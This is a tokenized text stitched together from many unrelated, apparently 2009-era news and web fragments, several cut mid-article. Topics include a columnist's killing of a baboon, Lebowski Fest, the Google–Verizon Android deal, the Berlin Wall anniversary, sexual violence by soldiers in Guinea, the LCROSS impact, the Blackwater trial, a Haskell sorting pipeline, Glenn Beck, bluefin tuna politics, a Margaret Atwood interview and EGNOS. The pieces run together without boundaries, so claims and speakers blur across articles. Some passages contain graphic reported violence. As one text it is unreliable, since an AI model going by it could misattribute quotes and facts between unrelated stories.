He slumped and slid sideways .
I 'm told they can be tricky to shoot : they run up trees , hang on for grim life .
They die hard , baboons .
But not this one .
A soft - nosed .357 blew his lungs out . "
Claire Bass , wildlife manager at the World Society for the Protection of Animals : " It 's hard to say what 's sadder – the unnecessary death of a healthy baboon or that he has so little regard for the life of another creature .
The vast majority of visitors to the Serengeti have a fantastic time shooting with cameras , not guns .
We condemn the killing and the crude portrayal of it as ' entertainment ' in Gill 's column . "
Guy Norton , who studies the behaviour of baboons in Makumi National Park in Tanzania , said baboons are " sentient and feeling animals " and display similar characteristics to humans with strong parental bonds and sociable group behaviour .
" I can understand the repulsion people are feeling because it is hard to see why he would do this in the first place , " said Norton .
" I can understand it if there was a purpose , but what Gill is talking about is not responsible hunting . "
He added that the animal described by Gill sounded like an olive baboon , which is not endangered .
Gill admitted he had no good reason for killing the animal .
" I know perfectly well there is absolutely no excuse for this , " he wrote .
" There is no mitigation .
Baboon is n't good to eat , unless you 're a leopard .
The feeble argument of culling and control is much the same as for foxes : a veil for naughty fun .
I wanted to get a sense of what it might be like to kill someone , a stranger .
You see it in all those films : guns and bodies , barely a close - up of reflection or doubt .
What does it really feel like to shoot someone , or someone 's close relative ? "
Baboons are seen as a threat by some people in Tanzania because they raid crops , and farmers who need to control their populations can apply for licences to kill them in some areas .
They have been classed as vermin in the country and often live on the edges of farming areas .
Indeed .
The Dude ( played by Jeff Bridges ) is an accidental guru , a Zen master in bathrobe and jelly sandals : unemployed , unperturbed , unburdened by the judgment of others .
He hangs out with Walter ( John Goodman ) , a deranged vet , and dim , amiable Donny ( Steve Buscemi ) .
For recreation ?
“ The usual : I bowl .
Drive around .
The occasional acid flashback . ’’
Some might spin the Dude less charitably , with words like lazy and loser .
But for a certain slice of humanity he is an icon and an inspiration .
“ I think he ’s a hero because he ’s so different from what you see in the world as a hero , ’’ says Will Russell , who dreamed up Lebowski Fest with his pal Scott Shuffitt during a lull in T - shirt sales at a Louisville , Ky. , tattoo convention .
Russell and Shuffitt call themselves the founding dudes .
“ He ’s the opposite of society ’s idea of achievement .
He does n’t have a career , a nice car , a wife and kids .
He has nothing going on , but he seems genuinely content . ’’
The film - which was released to mixed reviews and spent all of six weeks in theaters , barely recouping its $ 15 million budget - has spawned a vibrant subculture that draws both scholars and slackers to the fold .
The Dude has been cited in hundreds of doctoral dissertations and academic papers over the past decade .
There is a religion called Dudeism , boasting more than 50,000 ordained Dudeist priests , and a publication called the Dudespaper , “ a lifestyle magazine for the deeply casual . ’’
Film producer Jeff Dowd , the actual person on whom the character of the Dude is based , has launched a second career making personal appearances as The Real Lebowski .
This weekend an annual convocation called Lebowski Fest rolls into Boston for the first time , to rally the faithful with a film screening at the House of Blues and a bowling party at Kings Lanes .
To the uninitiated , “ The Big Lebowski ’’ probably does n’t sound like the sort of cinematic watershed that would translate to an enduring cultural phenomenon .
But the movie has become just that .
And we ’re not talking about action figures and keychains , although they ’re yours for the ordering .
That ’s the basic premise of “ The Big Lebowski , ’’ the Coen Brothers ’ 1998 stoner caper , which also involves bowling , nihilism , a kidnapping , and many , many White Russians - a cocktail whose parts combine more cogently than the film ’s plot points .
So there ’s this guy named the Dude , and some dudes break into his apartment and pee on his rug , so the Dude , an LA burnout whose real name is Jeffrey Lebowski , goes to find the other Jeffrey Lebowski , a rich guy the intruder dudes were actually looking for , so he can get him to replace the soiled rug , which totally tied the room together .
Edward Comentale , an English professor at Indiana University and co-editor of a forthcoming collection of essays titled “ The Year ’s Work in Lebowski Studies , ’’ led a two - day symposium at the 2006 Lebowski Fest in Louisville .
Many of the papers delivered there also made it into the book , among them “ The Really Big Sleep : Jeffrey Lebowski as the Second Coming of Rip Van Winkle , ’’ “ Logjammin ’ and Gutterballs : Masculinities in The Big Lebowski , ’’ and “ A Once and Future Dude : The Big Lebowski as Medieval Grail - Quest . ’’
Comentale says that aside from the being the cheapest academic conference ever held ( $ 125 for the function room at a local bowling alley ) the gathering was a heart - warming collision of highbrow inquiry and bad pizza .
“ We found a real connection with the fan culture , because they approach the film much like professors approach text .
They love to quote it .
It revolves around citation , debating the characters and gestures and motives , tracking down references .
The fans are hungry for interpretation , ’’ Comentale says .
“ They do n’t watch this film in a passive way . ’’
Tell that to Jason Brandenburg , a 35 - year - old paralegal who lives in the South End .
He somewhat shamefully admits that he ’s seen the movie 40 or 50 times - “ I know people have probably seen it several hundred times ’’ - and is fond of playing it with the sound off during parties .
That sounds good to Tara Colardeau , 26 , who lives in Newton and is “ in a very Dude - like way unemployed . ’’
“ So many subtle things happen in the background .
In the Dude ’s bathroom , there ’s no toilet paper on the roll , ’’ says Colardeau , who is attending Lebowski Fest as Walter ’s ex-wife ’s Pomeranian .
“ I found a werewolf hat and I have a little terry sweatsuit and some furry leg warmers .
Also a first - place ribbon and my papers .
I just do n’t want to be confused with the ferret . ’’
Nathan Burke , a 30 - year - old marketing manager who lives in Waltham and is dressing as Walter for Lebowski Fest , echoes what many feel about the film when he says that “ every character reminds me of someone I know .
I think everyone knows a Dude , who ’s lazy and avoids conflict , and a Walter , who explodes at the drop of a hat , and a Donny , who ’s sweet but annoying .
It ’s damn hilarious . ’’
“ The Achievers , ’’ a documentary about the film ’s fanatical following , will be released on DVD next month .
Taking their name from a group of disadvantaged kids for whom the rich Lebowski is benefactor , the Achievers have formed a classic cult community , according to the Brattle Theatre ’s creative director , Ned Hinkle .
“ Most cult films are flawed in one way or another , but they have amazing characters and quotable lines , ’’ says Hinkle , who notes that even though people are screening “ The Big Lebowski ’’ voraciously at home , “ when the Brattle or the Coolidge plays it , it still brings in a good crowd .
It engenders a real community spirit . ’’
Maybe that ’s because above and beyond the film ’s copious historical and genre influences - westerns , noir , Fluxus , surrealism , slackerism , Busby Berkeley , buddy flicks , war films , and the list goes on - “ The Big Lebowski ’ ’ is about friendship , says professor Comentale .
“ There ’s something about the warmth and tenderness between the characters , these people who are otherwise socially rejected , that plays out in the viewing , ’’ Comentale says .
“ I ’m struck by the fans who have so much affection for the Dude .
He ’s stalled , but he is n’t a loser .
He represents an easier way of being in the world . ’’

Google has teamed up with Verizon Wireless to jointly develop a long line of Android - based mobile devices for use on America 's largest cellular network .
Two Android phones will arrive on Verizon 's network before the end of the year , and the two companies indicated their Android line will eventually include non-phones as well , including netbooks .
Google chief Eric Schmidt and Verizon boss Lowell McAdam announced the partnership during a webcast from New York on Tuesday .
Eighteen months in the works , the deal brings together two companies that were once bitter rivals in the rather amusing war over open wireless access .
In early 2008 , Google famously gamed the FCC's 700 - MHz wireless auction , sticking Verizon with an open access requirement the telco fought so hard to avoid .
And even after the requirement was in place , the Mountain View Chocolate Factory continued to question how open Verizon 's network would be .
But in the new wireless order that followed the 700 - MHz auction - not to mention the arrival of Apple 's iPhone on AT&T 's network - Verizon can't help but repaint itself as an open champion .
" [ Google and Verizon ] are committed to devoting substantial resources over the next several years to bring the latest applications - in fact , industry - leading applications - to our customers on the latest third generation and fourth generation broadband networks , " Verizon chief McAdam said .
" Devices will come loaded with innovative applications from both our companies as well as from third - party leading - edge developers around the world . "
Naturally , the Google - Verizon devices will include the Android Marketplace - Google 's answer to the iPhone App Store - and the first phones should offer Google Voice , the telephony app famously unavailable on Steve Jobs ' handheld status symbol .
" You either have an open device or not , and this will be open , " McAdam said .
" We expect to bring [ Google Voice ] to market when we bring the first device out . "
Eric Schmidt at least alluded to the fact that such Verizon talk is , shall we say , a new approach .
" [ Google ] did not know - until we spent some time getting to know each other - that [ Verizon ] would take such a leadership position on openness , which was frankly enormously surprising given the history and the old - line nature of telcos , " Schmidt spun , in his typically haughty tones .
Verizon is the third US carrier to embrace Android , following T - Mobile and Sprint .
T - Mobile debuted the first Android phone more than a year ago , and Sprint followed this fall .
McAdam said the first Google - Verizon phones will be formally announced in " the next several weeks . "
Tuesday 's partnership announcement comes on the eve of the CTIA Wireless trade show in San Diego .
Meanwhile , Verizon has launched a series of television adverts aimed at all those American iPhone users who 've grown increasing annoyed at the network coverage provided by exclusive Apple partner AT&T .
One ad plays off Apple 's ubiquitous " There 's an app for that " ads :
" If you want to know why your 3G coverage works so well on Verizon Wireless , there 's a map for that , " the ads says , a Verizon coverage map appears above the head of a strolling Verizon customer .
Then an AT& Ter appears .
" If you want to know why some people have spotty 3G coverage , " the ad says , " there 's a map for that too . " ®
In Bristol , the home of the artist Banksy , graffiti has been elevated to an art - form .
A couple of years ago , the local council there accidentally painted over a mural by Banksy , which was estimated to be worth £ 100,000 .
To avoid further embarrassment , it is letting local residents vote on whether the graffiti in their area should be scrubbed off the walls or kept for posterity .
CONFIDENTIAL TO CANADIANS : do n't tell anyone that these are special coins , let everyone think our country is a land of whimsical currency and pocket - book surprises , okay ??
One year ago today : when you notice these things happening , it 's good to point them out .

Advertisement World leaders have hailed the Berlin Wall 's fall in celebrations 20 years on from the upheaval that changed Europe .
German Chancellor Angela Merkel was joined at the Brandenburg Gate by Russia 's Dmitry Medvedev , France 's Nicolas Sarkozy and UK PM Gordon Brown .
In a special video address , US President Barack Obama said Berliners had rebuked tyranny on 9 November 1989 .
The event two decades ago led Germany to reunify , caused the collapse of the Soviet Union and the Cold War 's end .
Communist East Germany erected the 155 - km ( 96 - mile ) concrete barrier in 1961 to encircle West Berlin and prevent citizens from fleeing into the capitalist enclave .
There could be no clearer rebuke of tyranny , no stronger affirmation of freedom

In quotes : Twenty years on Russia 's mixed feelings
At least 136 people are thought to have been killed at the wall while trying to escape .
Ms Merkel - who grew up in East Germany - presided over Monday 's celebrations , which were attended by tens of thousands of people despite a downpour of rain .
She led a procession of leaders through the Brandenburg Gate - the symbol of German reunification in 1990 .
The presidents of Russia and France , the British premier and US Secretary of State Hillary Clinton were among those who joined the German chancellor .
Ms Merkel said the events of 20 years ago had shown the world could tackle new challenges , from poverty to climate change .
" Together we brought down the Iron Curtain and I am convinced this can give us the strength for the 21st century , " she said .
HOW THE WALL FELL 13 Aug 1961 : East Germany erects the Berlin Wall Aug - Sep 1989 : Tens of thousands of East Germans seek asylum abroad as communist control over Eastern Europe relaxes 7 Oct : Soviet leader Mikhail Gorbachev indirectly calls for reform on a visit to East Berlin 18 Oct 1989 : Egon Krenz replaces Erich Honecker as East Germany 's leader after anti-government protests 4 Nov : Mass protests by East Germans culminate in a million - strong rally in Berlin 9 Nov :
The Wall is breached after the East German government moves to lift curbs on travel over the border to West Germany
Hewitt : Exhilaration of freedom
Wall 's fall : Your memories
The night the Wall fell Mrs Clinton also spoke , before introducing a surprise video address from Washington by Mr Obama .
" There could be no clearer rebuke of tyranny .
There could be no stronger affirmation of freedom , " he said of the wall 's tearing down .
Mr Medvedev said the wall 's collapse had helped Russia and Germany end their World War II enmity .
He said he hoped everyone had rejected the dividing lines represented by the wall .
In his speech , Mr Brown told Berliners : " You dared to dream in the darkness .
You knew that while force has the temporary power to dominate , it can never ultimately dictate . "
After the leaders spoke , a chain of 1,000 giant foam dominoes - painted with messages of freedom by young people - was toppled along where the wall once stood .
The symbolic act was to reflect how the then Communist governments of Eastern Europe fell one after another .
The first wave of dominoes were knocked over by former Polish President Lech Walesa and ex-Hungarian Prime Minister Miklos Nemeth .
Mr Nemeth 's decision to open his country 's borders first allowed East Germans to flee to the West .
The festivities were capped with fireworks and a concert featuring music from Berlin 's State Opera and the American rock band Bon Jovi .
Earlier in the day , Ms Merkel retraced her steps on the night the wall fell by crossing the first checkpoint to open 20 years ago .
The German chancellor was joined by ex-Soviet leader Mikhail Gorbachev and Mr Walesa , the former Polish trade union leader and later president , whose movement was the first to challenge Communist rule successfully in Eastern Europe .
There were cheers from hundreds of onlookers as Ms Merkel praised Mr Gorbachev for helping to make change possible .
Earlier , Ms Merkel said in a TV interview that German unity was still incomplete , as the East lagged in economic growth .

CONAKRY , Guinea  Cellphone snapshots , ugly and hard to refute , are circulating here and feeding rage : they show that women were the particular targets of the Guinean soldiers who suppressed a political demonstration at a stadium here last week , with victims and witnesses describing rapes , beatings and acts of intentional humiliation .
“ I ca n’t sleep at night , after what I saw , ” said one middle - aged woman from an established family here , who said she had been beaten and sexually molested .
“ And I am afraid .
I saw lots of women raped , and lots of dead . ”
One photograph shows a naked woman lying on muddy ground , her legs up in the air , a man in military fatigues in front of her .
In a second picture a soldier in a red beret is pulling the clothes off a distraught - looking woman half - lying , half - sitting on muddy ground .
In a third a mostly nude woman lying on the ground is pulling on her trousers .
The cellphone pictures are circulating anonymously , but multiple witnesses corroborated the events depicted .
NASA 's Lunar Prospector first detected some hydrogen signatures in craters on the dark side of the moon in 1999 .
Ever since , researchers have been keen to confirm the presence of water on the moon .
The Lunar CRater Observing and Sensing Satellite ( LCROSS ) is tasked with crashing through the mists of speculation and conjecture and discover the truth .
And you can watch all the action as it happens .
LCROSS was launched on June 18th and executed a fly - by of the moon five days later before entering into a wide orbit .
On Friday October 9th , the craft will start to make its final approach , not to land but to crash land .
The upper stage rocket in front , the Centaur , will separate from LCROSS which will , in turn , slow down a little .
Creating a four minute gap between each vessel , the Centaur will crash into the Cabeus crater at the Moon 's south pole .
The heavy impact will create a great plume of debris .
Following behind , the LCROSS will pass through the debris , collecting and relaying data back to Earth before itself impacting the crater .
As well as a visible camera and radiometer , the LCROSS payload also includes two near - infrared spectrometers , a visible light spectrometer , two mid-infrared cameras and two near - infrared cameras .
" As the ejecta rises above the target crater 's rim and is exposed to sunlight , any water - ice , hydrocarbons or organics will vaporize and break down into their basic components .
These components primarily will be monitored by the visible and infrared spectrometers .
The near - infrared and mid-infrared cameras will determine the total amount and distribution of water in the debris plume .
The spacecraft 's visible camera will track the impact location and the behavior of the debris plume while the visible radiometer will measure the flash created by the Centaur impact , " NASA explains in the mission overview .
The good news for all you space fans out there is that NASA will be broadcasting the whole event live on NASA TV .
The one and a half hour long show will start at 6:15 am EDT / 3:15 am PDT on Friday October 9th , with the first impact currently scheduled for 7:30 am EDT / 4:30 am PDT .
The broadcast will include live footage from the spacecraft 's camera , real - time telemetry based animation , various location clips and ( of course , sports fans ) live commentary with special guests .

Prosecution of five Blackwater employees could be thrown out over immunized statements
A US District Court judge has barred the public from attending — or the media from reporting on — hearings in the trial of five Blackwater employees charged over the killing of 14 Iraqi civilians in Baghdad ’s Nisoor Square in 2007 .
A breaking story at the Washington Post reports that hearings to determine whether evidence against the accused was properly collected will be kept under wraps .
ADVERTISEMENT
At issue are statements the State Department collected from Blackwater immediately after the incident .
In exchange for the employees ’ co-operation , the State Department , then under the control of the Bush administration , granted the Blackwater guards immunity from prosecution over their statements .
The current case being pursued by the Justice Department is being crafted so as to avoid using the immunized statements .
But Judge Urbina ordered hearings into whether those statements were used to gather evidence after all .
If it turns out they were , the judge will likely throw out the case against the five Blackwater employees , the Post reports .
The Nisoor Square massacre took place on September 17 , 2007 , when Blackwater guards escorting a State Department convoy through Baghdad opened fire on civilians in Nisoor Square , in what is largely considered an unprovoked act .
Evidently the Blackwater guards started firing when a civilian vehicle was spotted driving down the wrong side of the road near the convoy .
The Post reports :
The five guards — Paul Slough , Nicholas Slatten , Evan Liberty , Dustin Heard and Donald Ball — are charged with voluntary manslaughter and weapons violations in the killing of 14 civilians and the wounding [ of ] 20 others .
The Justice Department alleges that the guards unleashed an unprovoked attack on Iraqi civilians in Nisoor Square while in a convoy .
One guard , Jeremy P. Ridgeway , has pleaded guilty and is expected to testify against the others .
The proceedings underway in the District ’s federal court , known as Kastigar hearings , will probe how well investigators gathered evidence without being tainted by those immunized statements .
If the judge finds the government ’s case is tainted , he might be forced to throw out the indictment .
The State Department canceled its Iraq security contract with Blackwater , now known as Xe Services , shortly after President Obama ’s inauguration .
The Post reported at the time that the company had made $ 1.3 billion from contracts with the State Department .
Lembas
From postings to rec.arts.books.tolkien by BThompson < williamt-aaaaaaat-lamar-dawt-colostate.edu > , dated 11 April and 18 September 1995 .
Has anyone else noticed the apparent similarities between Lembas and Hostess Twinkies ?
Please consider the following :
1 ) Both are lightly - baked cakes with creme filling .
2 ) Both are hermetically - sealed in some type of wrapper ( mallorn leaf for lembas and malleable plastic leaf for Twinkies ) .
3 ) Both will remain fresh if their wrapping remains unbroken ( in fact , Twinkies are reputed to have a shelf - life of several million years either in or out of their wrapping ) .
Are lembas an early prototype for the modern - day Twinkies ?
Any and all comments are welcome .
All golden Twinkies do not glitter ,
Not all consumed Twinkies are tossed ;
The old that is preserved does not wither ,
Their yellow - dyed color is not lost .
In the stomach a fire shall be woken ,
A Tums from the bottle shall spring ,
Renewed shall be revulsion unbroken ,
Hostess cakes again are the thing .
In previous posts , I have explained the ( fixed capacity ) sort pump , and expanding pipelines .
We can combine these ideas to form an expanding sort pump that grows as required .
The sort pump as originally described was fixed capacity — if you send that sort pump a list that is longer than its stated capacity , it would n’t work correctly .
We could set - up and tear - down the list of processes each time if we wished , but there is also another solution — a pipeline of processes that automatically grows to the longest required length .
To implement the growing pipeline , we pass each component process a flag that indicates whether it is the final process in the pipeline .
If this flag is True ( it ’s the last process ) and the process wants to send a non-flush message onwards ( there ’s no - one there ! ) , it automatically splits itself into two component processes .
By this mechanism , the pipeline will grow as long as needed , with the last process always splitting itself into two when needed :
highestFlushGrow :: Ord a =>
Bool -> Maybe a -> Chanin ( FlushOrNormal a ) -> Chanout ( FlushOrNormal a ) -> CHP ( ) highestFlushGrow last initVal input output = maybe empty full initVal where empty = do x <- readChannel input case x of Flush _ -> writeChannel output x >> empty Normal y -> full y full cur = do x <- readChannel input case x of Flush xs -> writeChannel output ( Flush ( cur:xs ) ) >> empty Normal new -> let ( low , high ) = if cur < new then ( cur , new ) else ( new , cur ) in if not last then writeChannel output ( Normal low ) >> full high else ( highestFlushGrow False ( Just high ) |->| highestFlushGrow True ( Just low ) ) input output
So now our wrapper process does n’t need to start a pipeline of these things — it just starts with a single process , and the automatic growth will take care of the rest :
sorterGrow :: Ord a => Chanin [ a ] ->
Chanout [ a ] -> CHP ( ) sorterGrow input output = do pumpIn <- oneToOneChannel pumpOut <- oneToOneChannel highestFlushGrow True Nothing ( reader pumpIn ) ( writer pumpOut ) < |*|> ( forever $ do xs <- readChannel input mapM_ ( writeChannel ( writer pumpIn ) .
Normal ) xs writeChannel ( writer pumpIn ) $ Flush [ ]
Flush xs ' <- readChannel ( reader pumpOut ) writeChannel output xs ' )
This is a slight variation on the expanding pipeline seen in the primes example .
In that example we had an explicit “ end ” process that added on a new filter Div process whenever it received an item .
Here , we let the highestFlushGrow process know whether it is the last process in the pipeline , and it splits itself .
So we do not need any other type of process in the pipeline besides highest FlushGrow .
This pipeline will grow to have as many processes as there are items of data ( before the flush ) .
However , it will not — as it stands — shrink again if future lists are shorter .
That is a little more difficult , and I will return to it in a future post .

On his radio show today Glenn Beck claimed Barack Obama is on a mission to take out Fox News or any media that challenges him .
Beck called Obama a dictator , and compared Fox News to the Jews during the Holocaust , while warning that when Obama is done with FNC , he is going to come after other news organizations .
Here is the audio courtesy of Media Matters :

Beck said , “ When they ’re done with Fox , and you decide to speak out on something .
The old , “ first they came for the Jews , and I was n’t Jewish . ”
When you have a question , and you believe that something should be asked , they ’re a — totally fine with you right now ; they have no problem with you . ”
He continued , “ When they ’re done with Fox and talk radio , do you really think they ’re going to leave you alone if you want to ask a tough question ?
Do you really think that a man who has never had to stand against tough questions and has as much power as he does — do you really believe after he takes out the number one news network , do you really think that this man is then not going to turn on you ?
That you and your little organization is going to cause him any hesitation at all not to take you out ? ”
He concluded by leading his listeners to believe that this is the beginning of the Obama dictatorship , “ If you believe that , you should open up a history book , because you ’ve missed the point of many brutal dictators .
You missed the point on how they always start . ”
Beck ’s obsession with the Nazis has returned , but his comparison of Fox News to the Jews is an insult to every Jewish person out there .
Why does the right wing feel the need to trivialize the Holocaust ?
What exactly has Barack Obama done to right wing media that would confirm any dictatorial tendencies ?
The Obama / Nazis comparison does n’t hold up .
If Obama actually was a dictator , he would not allow talk radio and Fox News to exist .
He and his administration would not be taking digs at them occasionally .
He would have sent the military in and shut them down .
He would have rounded up and arrested all dissent .
That is what a dictator does .
Barack Obama is not a dictator .
Beck ’s whole anti-Obama rant is hypocritical because Barack Obama ’s election has been the best thing to happen to right wing media since Bill Clinton was in the White House .
Do you think that Glenn Beck would have experienced such a meteoric rise , if John McCain had won the election last year ?
The fear and paranoia of the right since Obama ’s election has made Glenn Beck .
Beck needs Obama .
No one should believe that his audience would be just as large if he was weaving his paranoid conspiracy theories about John McCain every day .
Glenn Beck , Rush Limbaugh and the rest , need Barack Obama .
The one thing that Beck will never tell his listeners is that he is secretly happy that Obama is in office , because without Obama , Beck would still be struggling like he was at Headline News .
The last chance to save one of the most majestic fish in the sea is on the verge of collapse because of political jockeying in Europe .
A proposal to ban the sale of bluefin tuna is being fiercely opposed by Malta , the capital of the lucrative global business , and by its representative in Brussels , the fisheries commissioner , Joe Borg .
Spain and Italy are also believed to be resisting an application to bar trade in bluefin under the Convention on the International Trade in Endangered Species ( Cites ) , which would cut off exports to the main market , Japan .
Download the new Independent Premium app Sharing the full story , not just the headlines
The European Commission will decide next week whether the EU will submit the application to a Cites committee meeting in March .
Conservationists fear that support from Britain , France and other northerly European nations for decisive action is wavering amid the objections .
The Commission is divided , with Brussels sources saying Mr Borg is fighting his environment counterpart , Stavros Dimas , who supports a ban .
Japan has also been lobbying all EU states , telling them that the management of the stock is improving .
Britain describes Japan 's approach as " not unexpected " , though conservationists accuse Japan of interfering in the EU 's internal decision - making .
Such has been the controversy that the European Commission President , José Manuel Barroso , is set to take charge of the issue at his cabinet meeting on Thursday .
Groups such as WWF and Greenpeace fear that negotiations to break the deadlock may result in a compromise of the Cites Appendix II listing , which would allow a limited trade that would be used to launder vast quantities of illegally - caught fish .
A single bluefin tuna can fetch tens of thousands of pounds on Tokyo's fish markets , making the trade highly valuable for trawlers and ranches that fatten young specimens .
Spotter planes are illegally used to find the creatures in the sea and organised crime in Italy is believed to play a role in illegal " pirate " fishing .
The WWF says that breeding stocks of bluefin tuna will disappear within two years at current rates of fishing , although some fear that given the small size of bluefins on the Tokyo fish markets , it may have already collapsed .
In a last - ditch rescue mission this summer , the Mediterranean principality of Monaco suggested bypassing the discredited fisheries body in charge of bluefin , the International Council for the Conservation of Atlantic Tuna ( Iccat ) , by appealing to Cites for an outright ban .
Despite owning a significant bluefin fleet , France threw its weight behind the plan , to the surprise of conservationists .
President Nicolas Sarkozy said that decades of over - fishing would have to end .
Britain , Germany and other mostly northerly European states with direct financial interest in the fish also expressed support for a ban .
On reaching a final position , the EU 's 27 member states will vote as a bloc among the 175 - nation meeting of Cites in Doha , Qatar , in March .
Other countries are likely to heed Europe 's views , given the bluefin is fished in its waters .
Such high stakes have led to tense wrangles in Brussels , with commissioners Dimas and Borg again failing to reach agreement in a face - to - face meeting yesterday .
Some conservationists wonder whether Mr Borg may have been influenced by the bluefin tuna industry in Malta , which employs 1,000 of the country 's 400,000 citizens and is worth € 100 m ( £ 87 m ) a year .
Mr Borg , who will seek Malta 's re-appointment to his Commission post in the next month , indicated that he preferred waiting for an update on a rescue plan from Iccat after its next meeting , which would be after the Cites deadline for applications for a ban .
Aaron McLoughlin , the WWF fisheries representative in Brussels , said : " As ever with commissioners , whatever happens at home always grabs special attention .
It 's a real issue for him , just like the German commissioner will have an interest in all car matters . "
Mr Borg 's spokeswoman , Nathalie Charbonneau , said any suggestion that he had been influenced by the Maltese government was " false and wrong " .
The actors Stephen Fry , Colin Firth and Emilia Fox have written to Mr Barroso , urging him to resist a compromise .
Attention on overfishing has intensified since the release this year of the film The End of the Line .
Greenpeace 's fish campaigner , Willie Mackenzie , said : " There 's incontrovertible scientific proof that the stocks are collapsing .
We understand the vast majority of the Commission thinks a ban is the right way to go – scientifically it 's the only way to go but politically there 's a hurdle to get over . "
For a speculative - fiction visionary who writes about bioengineered catastrophe , commodified humanity and environmental devastation , Margaret Atwood is one seriously sunny personality .
" I'm an optimist , " the decorated Canadian author explained by phone to Wired.com during a tour for her most recent book , The Year of the Flood , published in September .
" Anyone who writes this kind of stuff probably is .
If you were n't , you would n't waste your time writing the books . "
Atwood , who turns 70 in November , has an uncanny knack for tapping into humanity 's uncertain future and predicting mankind 's cultural , scientific and sociopolitical falls from glory .
Whether it's the rise of a fundamentalist American political regime poisoned by militarism and sexual perversity in her novel The Handmaid 's Tale , which won the Arthur C. Clarke award in 1985 , or the genetic pandemic of 2003's Oryx and Crake , her fiction has peeled back the skin of our disturbing subcutaneous nightmares .
Even her nonfiction wields a prescient hammer : Payback : Debt and the Shadow Side of Wealth , Atwood 's series of 2008 lectures analyzing the concept of debt through historical , scientific and literary prisms , emerged as a global economic recession built on excessive debt securitization strangled humanity 's financial state .
This is the nature of her speculative occupation , Atwood explained in her interview with Wired.com ( below ) .
Unlike sci - fi , spec - fi — especially her disastrously scary strain — has a chance of phasing into reality within our lifetime .
( Just do n't confuse the two , she insists . )
Whether humans experience the genetic apocalypse or waterless flood found in her latest speculative effort , or the fantastically clever but simple ways of forestalling an enviropocalypse most scientists have already priced into the market , Atwood suggests that science can save us all .
Hailing from a family of scientists , she 's well aware of technology 's power to help humanity evolve rather than wiping it out .
What matters is who 's wielding that power , and why .
Wired.com :
You come at science convincingly from the direction of fiction , and you 're pretty precise about your work , which you maintain is speculative fiction rather than sci-fi .
Margaret Atwood : I like exact labeling .
Speculative fiction encompasses that which we could actually do .
Sci -fi is that which we 're probably not going to see .
We can do the lineage : Sci -fi descends from H.G. Wells '
War of the Worlds ; speculative fiction descends from Jules Verne 's Twenty Thousand Leagues Under the Sea .
Out of Twenty Thousand Leagues Under the Sea came Edward Bellamy 's Looking Backward , out of which came We by Yevgeny Zamyatin , then George Orwell 's 1984 and Aldous Huxley 's Brave New World .
Ray Bradbury 's Fahreneheit 451 was speculative fiction , while The Martian Chronicles was not .
Wired.com :
But merges exist , aside from the historical designations .
Atwood :
Well , there 's a crossover park where sci- fi and fantasy play together .
But it 's really just a question of who is related to whom .
If you could do a DNA of books , you could trace the classifications of these kinds of writing .
Wired.com :
It seems that much of the blurring comes more from a lack of experience with these works , rather than some kind of postmodern sampling that erases points of reference .
Atwood : Right .
People have n't really read these books .
They want to know where to put it on the bookstore shelf .
When people first started writing this stuff , they did n't call it science fiction .
The first were called scientific romances .
Before that , there were utopias and dystopias .
Wired.com :
Are you a fan of that term , which is used to describe your work quite a bit ?
Atwood : People bat the term around a lot .
Dystopia means " unpleasant society " [ Laughs ] .
We generally know the area we are in when we say it , of course .
Wired.com : Year of the Flood is pretty dystopian , given it deals with the aftermath of an apocalyptic wipeout that reshapes our connection to the planet .
But it seems entirely plausible , given your research and the dense reading list posted on the book 's official site .
Atwood : I like to keep up .
I collect work that I think is pertinent to what I am doing .
It 's often interesting to see things that I 've written into the future , and find that years later , they 've been done .
Wired.com : Given Year of the Flood 's narrative of God 's Gardeners , who try to reconnect survivors to the ravaged planet using science and religion after predicting its eventual apocalypse , I 'm guessing you 've been following the news on climate change .
Can science and technology save us from the crazy world that scientists see coming our way this century and the next ?
Atwood :
The green technology plot is getting more interesting by the minute .
Necessity truly is the mother of invention .
Now that people see the great big mess coming before them , they are more interested in inventing things that can help .
I 'm really interested in solar fabrics that you can wear or put on walls .
Or Zerofootprint 's building reskinning contest , which puts a new skin on old buildings that are inefficient .
I saw another good one on algae walls .
Atwood Waxes Technophilic:____On a possible sequel to Year of the Flood : " You know the Map app for the iPhone ?
You load a grid , which starts coloring in where you are .
Then you get the blue directional pin that allows you to move the map .
Then you get more grid , which is then colored in for you .
Year of the Flood 's sequel is the part of that grid that is not colored in .
But I think it will have to do with Zeb , who breaks off from the pacifist Gardeners . "
Inventing the LongPen : " It 's a remote signature device .
It saves a ton of carbon .
We just did a LongPen event that took place simultaneously in Halifax , Vancouver , Toronto and Kitchener .
We signed books and staged a reading and Q&A that everyone could hear and see onscreen at the same time . "
Science in the blood :
" I grew up amongst the scientists .
My nephew is a physicist and another is a materials engineer .
My brother is a neuroscientist , so it 's not completely off the radar .
Wired is my recreational reading from the world of what I did n't become ....
I 've followed it for a while , and was part of Wired 's six - word story experiment . "
Wired.com : Year of the Flood features rooftop gardens , which have caught on .
Atwood :
That 's a growing movement ; so is urban beekeeping .
Same with growing certain weeds on your lawn , which are more adaptable to the climate and edible .
These are trends that people thought would be a good idea a while ago , and now they 're becoming necessary .
Wired.com :
But you 're also a fan of scientific solutions , even though Year of the Flood 's predecessor , Oryx and Crake , hinged on wipeout thanks to bad bioengineering .
Atwood :
Some bioengineering is good , especially if it results in plants that are more drought - resistant or perennial food crops .
Science is a tool , and we invent tools to do things we want .
It 's a question of how those tools are used by people .
A hammer is n't good or bad when it is lying on the table .
It 's about who and what are human beings ?
What are we doing to ourselves ?
What tools could we invent ?
What tools are we using unwisely ?
Wired.com :
Which do you think we 're using most unwisely ?
Atwood :
We 're using our engines , furnaces and heating technology unwisely at the moment .
We 're just wasting too much , and dumping too much carbon into the atmosphere , which everyone already knows .
We have to rethink our whole energy approach , which is hard to do because we 're so dependent on oil , not just for fuel but also plastic .
If plastic vanished , there would be total chaos .
We have to think quite carefully about using oil , and its derivatives , because it 's not going to be around forever .
Wired.com :
But you are optimistic we will be around to survive these catastrophes ?
Atwood :
The future is going to be a matter of will .
It will depend on the popular will , what you and I think , and getting that to politicians , who convert it to political will .
Of course , it does help if you 've got money to help put that will into place .
It 's a race against time .
Which comes first ?
Getting smart and doing something ?
Or watching time overtake us as everything falls apart ?

‘ Open Service ’ available : a new era for European navigation begins today
01/10/2009 4856 views 5 likes
During a press conference today , Mr Antonio Tajani , European Commission Vice - President for Transport Policy , announced the official start of operations for EGNOS , the European Geostationary Navigation Overlay Service .
The EGNOS ‘ Open Service ’ is now available .
This is a major milestone for the project : its primary service is now available to all users equipped with EGNOS - compatible receivers .
Most mass - market satellite navigation receivers being sold today are ready for EGNOS .
